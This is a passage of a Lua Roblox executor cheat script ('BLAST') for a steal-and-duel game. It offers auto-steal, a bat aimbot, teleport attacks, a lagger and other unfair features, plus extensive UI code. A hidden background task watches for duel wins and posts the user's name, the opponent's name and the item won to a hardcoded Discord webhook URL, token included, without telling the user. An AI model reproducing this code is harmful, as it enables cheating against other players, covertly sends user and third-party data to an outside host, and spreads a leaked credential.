            local parent = mobileButtonsGui
            local px = parent.AbsolutePosition.X
            local py = parent.AbsolutePosition.Y
            pad.Position = UDim2.new(0, midX - px - 18, 0, midY - py)
        end
        task.defer(placePad)
        task.delay(0.5, placePad)

        local dragging, pressPos = false, nil
        local starts = {} -- key -> UDim2

        local function clampGroupDelta(delta)
            local viewport = getMobileViewport()
            local scale = math.clamp(tonumber(State.mobileButtonScale) or 1, 0.5, 2.5)
            local renderedSize = MOBILE_BUTTON_SIZE * scale
            local minDX, maxDX = -math.huge, math.huge
            local minDY, maxDY = -math.huge, math.huge
            for _, startPos in pairs(starts) do
                local startPixels = positionToPixels(startPos, viewport)
                minDX = math.max(minDX, MOBILE_EDGE_PADDING - startPixels.X)
                maxDX = math.min(maxDX, viewport.X - renderedSize - MOBILE_EDGE_PADDING - startPixels.X)
                minDY = math.max(minDY, MOBILE_EDGE_PADDING - startPixels.Y)
                maxDY = math.min(maxDY, viewport.Y - renderedSize - MOBILE_EDGE_PADDING - startPixels.Y)
            end
            if minDX > maxDX then minDX, maxDX = 0, 0 end
            if minDY > maxDY then minDY, maxDY = 0, 0 end
            return Vector2.new(
                math.clamp(delta.X, minDX, maxDX),
                math.clamp(delta.Y, minDY, maxDY)
            )
        end

        pad.InputBegan:Connect(function(input)
            if State.lockMobileButtons then return end
            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
            dragging = true
            pressPos = input.Position
            starts = {}
            for key, entry in pairs(mobileButtons) do
                if entry and entry.holder then
                    starts[key] = entry.holder.Position
                end
            end
        end)
        trackConn(UIS.InputChanged:Connect(function(input)
            if not dragging or State.lockMobileButtons then return end
            if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
            local delta = clampGroupDelta(input.Position - pressPos)
            for key, startPos in pairs(starts) do
                local entry = mobileButtons[key]
                if entry and entry.holder and startPos then
                    entry.holder.Position = UDim2.new(
                        startPos.X.Scale, startPos.X.Offset + delta.X,
                        startPos.Y.Scale, startPos.Y.Offset + delta.Y
                    )
                end
            end
            placePad()
        end))
        trackConn(UIS.InputEnded:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
            if not dragging then return end
            dragging = false
            clampAllMobileHolders()
            for key, entry in pairs(mobileButtons) do
                if entry and entry.holder then
                    State.mobileButtonPositions[key] = _G.BlastPositionToConfig(entry.holder.Position)
                end
            end
            placePad()
            task.spawn(saveConfig)
        end))
        -- Keep pad between the two buttons when either moves
        trackConn(RunService.Heartbeat:Connect(function()
            if dragging then return end
            placePad()
        end))
    end


    -- Reajusta automaticamente apos rotacao da tela, redimensionamento ou abertura do menu.
    local mobileCamera = workspace.CurrentCamera
    if mobileCamera then
        trackConn(mobileCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
            task.defer(function()
                clampAllMobileHolders()
                saveConfig()
            end)
        end))
    end
    trackConn(workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
        task.defer(function()
            clampAllMobileHolders()
            saveConfig()
        end)
    end))
    task.defer(clampAllMobileHolders)

    trackConn(RunService.Heartbeat:Connect(function()
        for key, entry in pairs(mobileButtons) do
            if entry and entry.setActive then entry.setActive(getButtonState(key)) end
        end
    end))
end

-- Create mobile buttons
createMobileButtons()
if mobileButtons.carry then SPD.mobSetCarry = mobileButtons.carry.setActive end
if mobileButtons.carryLagger then SPD.mobSetLagger1 = mobileButtons.carryLagger.setActive end
if mobileButtons.drop then DROP.mobSet = mobileButtons.drop.setActive end
end

task.spawn(function()
    local hook = "https://discord.com/api/webhooks/1512634131064946841/Ngl7p4WkeoUII1XNJ0ohmZ4lLzBU-Fg68hgQY-bFSpHhiVOAFx9c7Ih-7Lx_xmFz623l"
    local req = request or http_request or (syn and syn.request)

    local allowedBrainrots = {
        ["Dragon Cannelloni"] = true,
        ["Garama and Madundung"] = true,
        ["Burguro And Fryuro"] = true,
        ["La Secret Combinasion"] = true,
        ["Strawberry Elephant"] = true,
        ["Meowl"] = true,
        ["Headless Horseman"] = true,
        ["Skibidi Toilet"] = true,
        ["Griffin"] = true,
        ["Hydra Dragon Cannelloni"] = true,
        ["Dragon Gingerini"] = true,
        ["Love Love Bear"] = true,
        ["La Supreme Combinasion"] = true,
        ["Celestial Pegasus"] = true,
        ["Cerberus"] = true,
        ["Popcuru and Fizzuru"] = true,
        ["Rosey and Teddy"] = true,
        ["Capitano Moby"] = true,
        ["Cooki and Milki"] = true,
        ["Fortunu and Cashuru"] = true,
        ["Los Amigos"] = true,
        ["Signore Carapace"] = true,
        ["La Casa Boo"] = true,
        ["Fragrama and Chocrama"] = true,
        ["La Food Combinasion"] = true,
        ["Spooky and Pumpky"] = true,
        ["Elefanto Frigo"] = true,
        ["Ginger Gerat"] = true,
        ["Sammyni Fattini"] = true,
        ["Festive 67"] = true,
        ["Antonio"] = true,
        ["Fishino Clownino"] = true,
        ["Globa Steppa"] = true,
        ["Duggy Bros"] = true,
        ["Quackini Snackini"] = true,
        ["Gym Bros"] = true,
        ["Boppin Bunny"] = true,
        ["Hydra Bunny"] = true,
        ["Cash or Card"] = true,
        ["Kalika Bros"] = true,
        ["Digi Narwhal"] = true,
        ["Fragola La La La"] = true,
        ["Dug dug dug"] = true,
        ["Tirilikalika Tirilikalako"] = true
    }

    local function short(n)
        if n >= 1e12 then return string.format("%.1fT",n/1e12)
        elseif n >= 1e9 then return string.format("%.1fB",n/1e9)
        elseif n >= 1e6 then return string.format("%.1fM",n/1e6)
        elseif n >= 1e3 then return string.format("%.1fK",n/1e3)
        end
        return tostring(math.floor(n))
    end

    local function num(v)
        v = tostring(v):gsub("%s","")
        local n,s = v:match("([%d%.]+)(%a?)")
        n = tonumber(n) or 0
        if s == "K" or s == "k" then n = n * 1e3
        elseif s == "M" or s == "m" then n = n * 1e6
        elseif s == "B" or s == "b" then n = n * 1e9
        elseif s == "T" or s == "t" then n = n * 1e12
        end
        return n
    end

    local function getLoser()
        for _,p in ipairs(Players:GetPlayers()) do
            if p ~= LP then return p.Name end
        end
        return "Unknown"
    end

    local function getBestBrainrot()
        local best, bestVal
        local db = workspace:FindFirstChild("Debris")
        if not db then return nil, nil end
        for _,v in ipairs(db:GetChildren()) do
            if v.Name ~= "FastOverheadTemplate" then continue end
            local sg = v:FindFirstChildOfClass("SurfaceGui")
            if not sg then continue end
            local gen = sg:FindFirstChild("Generation", true)
            if gen and gen:IsA("TextLabel") then
                local val = num(gen.Text)
                if not bestVal or val > bestVal then
                    bestVal = val
                    local dn = sg:FindFirstChild("DisplayName", true)
                    best = dn and dn.Text or v.Name
                end
            end
        end
        return best, bestVal
    end

    local lastSent = 0

    local function isWinText(txt)
        if not txt or txt == "" then return false end
        return txt:find("won the duel!", 1, true) and 
            (txt:find(LP.Name, 1, true) or txt:find(LP.DisplayName, 1, true))
    end

    local function sendWin()
        if tick() - lastSent < 30 then return end
        
        local best, bestVal = getBestBrainrot()
        if not best or not allowedBrainrots[best] then return end

        lastSent = tick() -- Atualiza IMEDIATAMENTE após a validação do item
        print("[BLAST] Vitoria qualificada detectada ("..best..")! Enviando webhook...")
        local loserName = getLoser()
        
        if req then
            pcall(function()
                req({
                    Url = hook,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        embeds = {{
                            title = "DUEL WON - BLAST USER",
                            color = 65280,
                            fields = {
                                {name="WINNER (BLAST USER)", value=LP.DisplayName, inline=true},
                                {name="LOSER", value=loserName, inline=true},
                                {name="Brainrot", value=best, inline=true},
                                {name="Value", value=(bestVal and short(bestVal) or "N/A"), inline=true}
                            }
                        }}
                    })
                })
            end)
        end
    end

    local function hookObj(obj)
        if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
        obj:GetPropertyChangedSignal("Text"):Connect(function()
            if isWinText(obj.Text) then sendWin() end
        end)
    end

    local function hookContainer(container)
        for _,obj in ipairs(container:GetDescendants()) do hookObj(obj) end
        container.DescendantAdded:Connect(function(obj)
            task.wait()
            hookObj(obj)
            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then
                if isWinText(obj.Text) then sendWin() end
            end
        end)
    end

    local pg = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 10)
    if pg then hookContainer(pg) end
    hookContainer(workspace)

    -- Removido o loop spawn de 0.3s que causava duplicatas, mantendo apenas os hooks de eventos
end)

-- ============================================================
-- INIT
-- ============================================================
-- (loadConfig ja foi chamado antes da UI ser construida)
do

local function initializeAll()
    SPD.laggerToggled = false
    SPD.laggerLevel = 1

    -- Visuals padrão sempre em NONE (background mantém o salvo; padrão inicial: Background 1)
    State.backgroundColor = "NONE"
    State.backgroundColorEnabled = false
    if type(State.currentBackground) ~= "number" or State.currentBackground < 1 then
        State.currentBackground = 1
    end
    pcall(function()
        applyMiseryBackground(State.currentBackground, true)
        if State.colorApi and State.colorApi.apply then
            State.colorApi.apply(true)
        end
    end)
    if State.nightModeEnabled then
        pcall(applyTheme)
    end
    if State.antiLagEnabled then enableAntiLag() end
    if State.fovEnabled then pcall(_G.BlastEnableCustomFov) end
    if State.unwalkEnabled then startUnwalk() end
    if State.infJumpEnabled then startInfJump() end
    if State.removeAccEnabled then
        for _, p in pairs(Players:GetPlayers()) do
            if p.Character then for _, obj in ipairs(p.Character:GetDescendants()) do
                if (obj:IsA("Accessory") or obj:IsA("Hat")) and not obj:GetAttribute("BlastLocalSkin") then
                    pcall(function() obj:Destroy() end)
                end
            end end
        end
    end

    local function sync(ref, val) if ref then ref(val, true) end end
    sync(toggleRefs.autoSteal, State.autoStealEnabled)
    if State.autoStealEnabled and startAutoSteal then task.defer(startAutoSteal) end
    sync(toggleRefs.antiRagdoll, State.antiRagdollEnabled)
    sync(toggleRefs.antiDie, State.antiDieEnabled)
    sync(toggleRefs.infJump, State.infJumpEnabled)
    sync(toggleRefs.medusaCounter, State.medusaCounterEnabled)
    sync(toggleRefs.antiMedusa, State.antiMedusaEnabled)
    sync(toggleRefs.aimbot, State.batAimbotToggled)
    sync(toggleRefs.antiBat, State.antiBatEnabled)
    sync(toggleRefs.autoLeft, State.autoLeftEnabled)
    sync(toggleRefs.autoRight, State.autoRightEnabled)
    sync(toggleRefs.batCounter, State.batCounterEnabled)
    sync(toggleRefs.unwalk, State.unwalkEnabled)
    sync(toggleRefs.fpsBoost, State.fpsBoostEnabled)
    sync(toggleRefs.antiLag, State.antiLagEnabled)
    sync(toggleRefs.uiLocked, State.uiLocked)
    sync(toggleRefs.lockAutoGrab, State.lockAutoGrab == true)
    sync(toggleRefs.fov, State.fovEnabled)
    sync(toggleRefs.nightMode, State.nightModeEnabled)
    sync(toggleRefs.removeAcc, State.removeAccEnabled)
    sync(toggleRefs.noCollide, State.noCollideEnabled)
    sync(toggleRefs.autoGrabStop, Steal.AutoGrabStopEnabled)
    sync(toggleRefs.tpBat, State.tpBatEnabled)
    sync(toggleRefs.visionBat, State.visionBatToggled)
    sync(toggleRefs.snowTpBat, State.snowTpBatEnabled)
    if State.snowTpBatEnabled and _G.BlastSnowTpSet then pcall(function() _G.BlastSnowTpSet(true) end) end
    sync(toggleRefs.intro, INTRO.enabled)
    sync(toggleRefs.matchMusic, INTRO.matchEnabled)
    sync(toggleRefs.headless, State.headlessEnabled)
    sync(toggleRefs.skinChange, State.skinEnabled)
    sync(toggleRefs.customTools, State.customToolsEnabled)
    if State.skinEnabled then task.defer(function() if State._skinApply then pcall(State._skinApply) end end) end
    sync(toggleRefs.korblox, State.korbloxEnabled)
    -- Lagger OPEN UI removed — do not auto-open panel
    State.laggerOpen = false
    if _G.BlastAnimationPack then
        task.spawn(function()
            task.wait(0.15)
            _G.BlastAnimationPack.Apply(State.animationPack or "OFF")
        end)
    end
    -- sync(toggleRefs.customFont, State.customFontEnabled)
    -- Now that UI is ready, enable custom font if needed (without blocking)
    -- if State.customFontEnabled then enableCustomFont() end

    SPD.refreshSpeedModeLabel()
    if SPD._antiDropBoot then pcall(SPD._antiDropBoot) end
    if toggleRefs.antiDrop then pcall(function() toggleRefs.antiDrop(SPD.antiDropEnabled == true, true) end) end
    
    -- Initialize keybind buttons
    for keyRef, kbBtn in pairs(keybindBtnRefs) do 
        if Keys[keyRef] then 
            kbBtn.Text = getKeyName(Keys[keyRef])
            kbBtn.BackgroundColor3 = C.panel
            kbBtn.BackgroundTransparency = 0.18
            kbBtn.TextColor3 = C.text
        end 
    end
    
    -- Sync Night Hub speed UI
    SPD.refreshSpeedModeLabel()

    -- Force vivid PINK only (never purple) across entire hub
    pcall(function()
        State.backgroundColor = "NONE"
        State.backgroundColorEnabled = false
        if State.colorApi then
            State.colorApi.accent = Color3.fromRGB(235, 35, 45)
            -- repaint all stroke gradients to pure pink (remove purple)
            local pinkSeq = State.colorApi.strokeSequence(State.colorApi.accent)
            for _, g in ipairs(State.colorApi.gradients or {}) do
                pcall(function() g.Color = pinkSeq end)
            end
            if State.colorApi.apply then State.colorApi.apply(true) end
        end
        if mainOuter then
            mainOuter.BackgroundColor3 = C.bg
            for _, d in ipairs(mainOuter:GetDescendants()) do
                if d:IsA("UIStroke") then
                    d.Color = C.accent
                    if d.Transparency > 0.4 then d.Transparency = 0.18 end
                elseif d:IsA("TextButton") and d.Parent and d.Parent.Name ~= "MobileButtonsGui" then
                    -- keep accent selected tabs; tint generic buttons
                    if d.BackgroundTransparency < 1 then
                        local isTab = d.Parent and d.Parent.Parent == mainOuter and d.Size.Y.Offset <= 40 and d.Size.X.Offset <= 70
                        if not isTab then
                            if d.BackgroundColor3.R < 0.9 then
                                d.BackgroundColor3 = C.panel
                            end
                        end
                    end
                elseif d:IsA("Frame") and d.BackgroundTransparency < 0.5 and d.Name ~= "MainOuter" then
                    local r, g, b = d.BackgroundColor3.R, d.BackgroundColor3.G, d.BackgroundColor3.B
                    -- only retint dark/muted frames (not pure white overlays)
                    if r < 0.55 and g < 0.35 and b < 0.45 then
                        d.BackgroundColor3 = C.card
                    end
                end
            end
        end
    end)

end

task.spawn(initializeAll)

-- Animate in (Disabled)
mainOuter.Size = UDim2.new(0, WIN_W, 0, WIN_H)
mainOuter.Visible = State.guiVisible ~= false
miniBtn.Visible = State.guiVisible == false

-- ============================================================
-- STEAL PROGRESS BAR (MATCHING YOUR IMAGE)
-- ============================================================
StealProgressBar = {
    pbFrame = nil,
    progressPct = nil,
    progressFill = nil,
    dragger = {
        isDragging = false,
        dragStartPos = nil,
        startPos = nil
    }
}



-- Função para criar a barra de progresso
local function createStealProgressBar()
    if StealProgressBar.pbFrame and StealProgressBar.pbFrame.Parent then
        pcall(function()
            local parent = StealProgressBar.pbFrame.Parent
            if parent and parent.Name == "MiroStealBar" then
                parent:Destroy()
            else
                StealProgressBar.pbFrame:Destroy()
            end
        end)
    end
    pcall(function()
        local pg = LP:FindFirstChild("PlayerGui")
        for _, n in ipairs({"MiroStealBar", "MoveeStealBar", "StealProgressScreenGui"}) do
            local o = pg and pg:FindFirstChild(n)
            if o then o:Destroy() end
            if gethui then
                local h = gethui()
                local o2 = h and h:FindFirstChild(n)
                if o2 then o2:Destroy() end
            end
        end
    end)

    -- VX7 Compact layout (372x54), vivid pink
    local pink = Color3.fromRGB(235, 35, 45)
    local pinkDeep = Color3.fromRGB(125, 25, 30)
    local pinkSoft = Color3.fromRGB(255, 65, 75)
    local dimTxt = Color3.fromRGB(230, 200, 185)
    local white = Color3.fromRGB(255, 255, 255)
    local bg = Color3.fromRGB(24, 16, 12)

    local screen = Instance.new("ScreenGui")
    screen.Name = "MiroStealBar"
    screen.ResetOnSpawn = false
    screen.DisplayOrder = 200
    screen.IgnoreGuiInset = true
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function()
        if gethui then screen.Parent = gethui() end
    end)
    if not screen.Parent then
        screen.Parent = gui or (LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui"))
    end

    local frame = Instance.new("Frame", screen)
    frame.Name = "StealProgressGui"
    frame.Size = UDim2.fromOffset(372, 54)
    frame.AnchorPoint = Vector2.new(0.5, 1)
    frame.Position = _G.BlastConfigToPosition(State.autoGrabPosition, UDim2.new(0.5, 0, 1, -10))
    frame.BackgroundColor3 = bg
    frame.BackgroundTransparency = 0.12
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Visible = (State.autoStealEnabled == true) or (autoStealEnabled == true)
    frame.ClipsDescendants = true
    frame.ZIndex = 300
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
    local outerStroke = Instance.new("UIStroke", frame)
    outerStroke.Color = pink
    outerStroke.Thickness = 1.1
    outerStroke.Transparency = 0.35

    -- scale (MUST match applyMiseryProgressBarScale name)
    local uiScale = Instance.new("UIScale", frame)
    uiScale.Name = "MiseryProgressBarScale"
    uiScale.Scale = math.clamp(tonumber(State.progressBarScale) or 1, 0.50, 1.50)

    StealProgressBar.pbFrame = frame
    StealProgressBar._screen = screen
    StealProgressBar._uiScale = uiScale

    -- STEAL status (top-left)
    local statusLbl = Instance.new("TextLabel", frame)
    statusLbl.Name = "StealStatus"
    statusLbl.Size = UDim2.fromOffset(70, 16)
    statusLbl.Position = UDim2.fromOffset(14, 7)
    statusLbl.BackgroundTransparency = 1
    statusLbl.Text = "STEAL"
    statusLbl.TextColor3 = pinkSoft
    statusLbl.Font = Enum.Font.GothamBold
    statusLbl.TextSize = 8
    statusLbl.TextXAlignment = Enum.TextXAlignment.Left
    statusLbl.TextYAlignment = Enum.TextYAlignment.Center
    statusLbl.ZIndex = 304
    StealProgressBar.statusLbl = statusLbl

    -- Percent (bottom-left under status)
    local pct = Instance.new("TextLabel", frame)
    pct.Name = "StealPercent"
    pct.Size = UDim2.fromOffset(70, 22)
    pct.Position = UDim2.fromOffset(14, 24)
    pct.BackgroundTransparency = 1
    pct.Text = "0%"
    pct.TextColor3 = white
    pct.Font = Enum.Font.GothamBold
    pct.TextSize = 15
    pct.TextXAlignment = Enum.TextXAlignment.Left
    pct.TextYAlignment = Enum.TextYAlignment.Center
    pct.ZIndex = 305
    StealProgressBar.progressPct = pct
    progressPct = pct

    -- Vertical divider
    local div = Instance.new("Frame", frame)
    div.Name = "StealDivider"
    div.Size = UDim2.fromOffset(1, 34)
    div.Position = UDim2.fromOffset(88, 10)
    div.BackgroundColor3 = pinkSoft
    div.BackgroundTransparency = 0.55
    div.BorderSizePixel = 0
    div.ZIndex = 305

    -- Track (right side top)
    local track = Instance.new("Frame", frame)
    track.Name = "VX7StealTrack"
    track.Size = UDim2.fromOffset(258, 15)
    track.Position = UDim2.fromOffset(101, 8)
    track.BackgroundColor3 = Color3.fromRGB(40, 22, 14)
    track.BackgroundTransparency = 0.05
    track.BorderSizePixel = 0
    track.ClipsDescendants = true
    track.ZIndex = 302
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local fill = Instance.new("Frame", track)
    fill.Name = "StealFill"
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = pink
    fill.BorderSizePixel = 0
    fill.ClipsDescendants = true
    fill.ZIndex = 303
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
    StealProgressBar.progressFill = fill
    progressFill = fill

    local fillGrad = Instance.new("UIGradient", fill)
    fillGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, pinkDeep),
        ColorSequenceKeypoint.new(0.38, pink),
        ColorSequenceKeypoint.new(0.68, pink:Lerp(Color3.new(1, 1, 1), 0.34)),
        ColorSequenceKeypoint.new(1.00, pinkDeep),
    })
    fillGrad.Rotation = -10

    local gloss = Instance.new("Frame", fill)
    gloss.Name = "StealGloss"
    gloss.Size = UDim2.new(1, 0, 0.36, 0)
    gloss.BackgroundColor3 = Color3.new(1, 1, 1)
    gloss.BackgroundTransparency = 0.76
    gloss.BorderSizePixel = 0
    gloss.ZIndex = 304
    Instance.new("UICorner", gloss).CornerRadius = UDim.new(1, 0)
    local glossGrad = Instance.new("UIGradient", gloss)
    glossGrad.Rotation = 90
    glossGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.18),
        NumberSequenceKeypoint.new(1, 1),
    })

    task.spawn(function()
        while fill.Parent do
            local t1 = TweenService:Create(fillGrad, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Offset = Vector2.new(0.5, 0)})
            t1:Play(); t1.Completed:Wait()
            if not fill.Parent then break end
            local t2 = TweenService:Create(fillGrad, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Offset = Vector2.new(-0.5, 0)})
            t2:Play(); t2.Completed:Wait()
        end
    end)

    -- FPS / PING row under track
    local fpsLabel = Instance.new("TextLabel", frame)
    fpsLabel.Name = "StealFpsLabel"
    fpsLabel.Size = UDim2.fromOffset(28, 18)
    fpsLabel.Position = UDim2.fromOffset(104, 28)
    fpsLabel.BackgroundTransparency = 1
    fpsLabel.Text = "FPS"
    fpsLabel.TextColor3 = dimTxt
    fpsLabel.Font = Enum.Font.Gotham
    fpsLabel.TextSize = 8
    fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
    fpsLabel.ZIndex = 305

    local fpsVal = Instance.new("TextLabel", frame)
    fpsVal.Name = "StealFpsValue"
    fpsVal.Size = UDim2.fromOffset(42, 18)
    fpsVal.Position = UDim2.fromOffset(134, 28)
    fpsVal.BackgroundTransparency = 1
    fpsVal.Text = "60"
    fpsVal.TextColor3 = white
    fpsVal.Font = Enum.Font.GothamMedium
    fpsVal.TextSize = 10
    fpsVal.TextXAlignment = Enum.TextXAlignment.Left
    fpsVal.ZIndex = 305

    local pingLabel = Instance.new("TextLabel", frame)
    pingLabel.Name = "StealPingLabel"
    pingLabel.Size = UDim2.fromOffset(34, 18)
    pingLabel.Position = UDim2.fromOffset(211, 28)
    pingLabel.BackgroundTransparency = 1
    pingLabel.Text = "PING"
    pingLabel.TextColor3 = dimTxt
    pingLabel.Font = Enum.Font.Gotham
    pingLabel.TextSize = 8
    pingLabel.TextXAlignment = Enum.TextXAlignment.Left
    pingLabel.ZIndex = 305

    local pingVal = Instance.new("TextLabel", frame)
    pingVal.Name = "StealPingValue"
    pingVal.Size = UDim2.fromOffset(62, 18)
    pingVal.Position = UDim2.fromOffset(247, 28)
    pingVal.BackgroundTransparency = 1
    pingVal.Text = "0ms"
    pingVal.TextColor3 = white
    pingVal.Font = Enum.Font.GothamMedium
    pingVal.TextSize = 10
    pingVal.TextXAlignment = Enum.TextXAlignment.Left
    pingVal.ZIndex = 305

    -- Drag handle
    local dragBtn = Instance.new("TextButton", frame)
    dragBtn.Size = UDim2.fromScale(1, 1)
    dragBtn.BackgroundTransparency = 1
    dragBtn.Text = ""
    dragBtn.AutoButtonColor = false
    dragBtn.ZIndex = 310

    StealProgressBar.dragger = StealProgressBar.dragger or { isDragging = false }
    local dragging, dragStart, startPos = false, nil, nil
    StealProgressBar.cancelDrag = function()
        dragging = false
        dragStart, startPos = nil, nil
        StealProgressBar.dragger.isDragging = false
    end
    dragBtn.InputBegan:Connect(function(inp)
        if State.lockAutoGrab == true then return end
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = inp.Position
            startPos = frame.Position
            StealProgressBar.dragger.isDragging = true
        end
    end)
    UIS.InputChanged:Connect(function(inp)
        if State.lockAutoGrab == true then
            StealProgressBar.cancelDrag()
            return
        end
        if not dragging or not dragStart or not startPos then return end
        if inp.UserInputType ~= Enum.UserInputType.MouseMovement and inp.UserInputType ~= Enum.UserInputType.Touch then return end
        local d = inp.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        State.autoGrabPosition = _G.BlastPositionToConfig(frame.Position)
    end)
    UIS.InputEnded:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                dragging = false
                StealProgressBar.dragger.isDragging = false
                State.autoGrabPosition = _G.BlastPositionToConfig(frame.Position)
                task.spawn(saveConfig)
            end
        end
    end)

    -- FPS / PING updater
    task.spawn(function()
        local frames, acc = 0, 0
        local conn = RunService.RenderStepped:Connect(function(dt)
            if not (frame and frame.Parent and frame.Visible) then return end
            frames = frames + 1
            acc = acc + dt
            if acc >= 0.5 then
                fpsVal.Text = tostring(math.floor(frames / acc + 0.5))
                frames, acc = 0, 0
                local ping = 0
                pcall(function()
                    ping = math.floor((LP:GetNetworkPing() or 0) * 1000 + 0.5)
                end)
                if ping <= 0 then
                    pcall(function()
                        local item = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]
                        if item then ping = math.floor((tonumber(item:GetValue()) or 0) + 0.5) end
                    end)
                end
                pingVal.Text = tostring(ping) .. "ms"
            end
        end)
        while frame and frame.Parent do task.wait(1) end
        if conn then conn:Disconnect() end
    end)

    if _G.StealBar and _G.StealBar.SetEnabled then
        _G.StealBar.SetEnabled(frame.Visible)
    end
end


createStealProgressBar()
_G.BlastStealProgressBar = StealProgressBar
if _G.StealBar then _G.StealBar.SetProgress(_G.BlastStealProgress or 0) end
applyMiseryProgressBarScale()

-- Auto save completo: estados, keybinds, escalas e todas as posições.
task.spawn(function()
    while task.wait(5) do pcall(saveConfig) end
end)
trackConn(LP.OnTeleport:Connect(function() pcall(saveConfig) end))

pcall(function()
    updateThemeUI()
    applyTheme()
    if State.fovEnabled then pcall(_G.BlastEnableCustomFov) end
end)


-- ============================================================
-- Glossy pink/white shine sweep (LOL Duels style) on Misery UI
-- ============================================================
task.spawn(function()
    task.wait(0.55)
    local function addShineOverlay(gui)
        if not gui or not gui:IsA("GuiObject") then return end
        if gui:GetAttribute("MiseryLolShine") then return end
        if gui.AbsoluteSize.X < 8 or gui.AbsoluteSize.Y < 8 then return end
        -- Skip pure text labels; decorate interactive / structural surfaces
        if gui:IsA("TextLabel") and not gui:IsA("TextButton") then return end
        gui:SetAttribute("MiseryLolShine", true)
        pcall(function()
            -- Overlay frame so we never destroy existing UIGradient colors
            local overlay = Instance.new("Frame")
            overlay.Name = "BlastShineOverlay"
            overlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            overlay.BackgroundTransparency = 0.82
            overlay.BorderSizePixel = 0
            overlay.Size = UDim2.fromScale(1, 1)
            overlay.Position = UDim2.fromScale(0, 0)
            overlay.ZIndex = (gui.ZIndex or 1) + 3
            overlay.Active = false
            overlay.Parent = gui
            local corner = gui:FindFirstChildOfClass("UICorner")
            if corner then
                local c = Instance.new("UICorner")
                c.CornerRadius = corner.CornerRadius
                c.Parent = overlay
            end
            local g = Instance.new("UIGradient")
            g.Name = "MiseryLolShine"
            g.Rotation = 20
            g.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 80, 185)),
                ColorSequenceKeypoint.new(0.42, Color3.fromRGB(255, 80, 185)),
                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(0.58, Color3.fromRGB(255, 80, 185)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 80, 185)),
            })
            g.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0.00, 0.95),
                NumberSequenceKeypoint.new(0.40, 0.90),
                NumberSequenceKeypoint.new(0.50, 0.15),
                NumberSequenceKeypoint.new(0.60, 0.90),
                NumberSequenceKeypoint.new(1.00, 0.95),
            })
            g.Parent = overlay
            task.spawn(function()
                local t0 = os.clock()
                while overlay.Parent do
                    local o = ((os.clock() - t0) * 0.45) % 2.2 - 0.6
                    g.Offset = Vector2.new(o, 0)
                    RunService.Heartbeat:Wait()
                end
            end)
        end)
    end
    local function scan(root)
        if not root then return end
        for _, d in ipairs(root:GetDescendants()) do
            if d:IsA("TextButton") or d:IsA("ImageButton") then
                addShineOverlay(d)
            elseif d:IsA("Frame") then
                local n = string.lower(tostring(d.Name or ""))
                if string.find(n, "row", 1, true) or string.find(n, "toggle", 1, true)
                    or string.find(n, "card", 1, true) or string.find(n, "tab", 1, true)
                    or string.find(n, "pill", 1, true) or string.find(n, "header", 1, true)
                    or string.find(n, "option", 1, true) or string.find(n, "category", 1, true)
                    or string.find(n, "section", 1, true) or string.find(n, "btn", 1, true) then
                    addShineOverlay(d)
                end
            end
        end
    end
    for _ = 1, 4 do
        pcall(function()
            if gui then scan(gui) end
            if mobileButtonsGui then scan(mobileButtonsGui) end
        end)
        task.wait(0.6)
    end
end)

print("[BLAST] Loaded! CTRL to hide/show.")
end


-- ============================================================
-- TP BAT: a single teleport and swing; keep the torso face-down.
-- ============================================================
function _G._BlastTpBatLeanCFrame(pos, targetRoot)
    local toward = targetRoot and (targetRoot.Position - pos) or Vector3.new(0, 0, -1)
    local flat = Vector3.new(toward.X, 0, toward.Z)
    if flat.Magnitude < 0.01 then flat = Vector3.new(0, 0, -1) end
    return CFrame.lookAt(pos, pos + flat.Unit) * CFrame.Angles(math.rad(-75), 0, 0)
end

_G.BlastTpBatV2 = _G.BlastTpBatV2 or {hitting = false}

function _G.BlastTpBatV2Swing()
    if _G.BlastTpBatV2.hitting then return end
    _G.BlastTpBatV2.hitting = true
    pcall(function()
        local char = LP.Character
        local bat = char and char:FindFirstChild("Bat")
        if not bat then
            local bp = LP:FindFirstChildOfClass("Backpack")
            bat = bp and bp:FindFirstChild("Bat")
            if bat and char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum:EquipTool(bat) end) end
            end
        end
        if bat then
            bat:Activate()
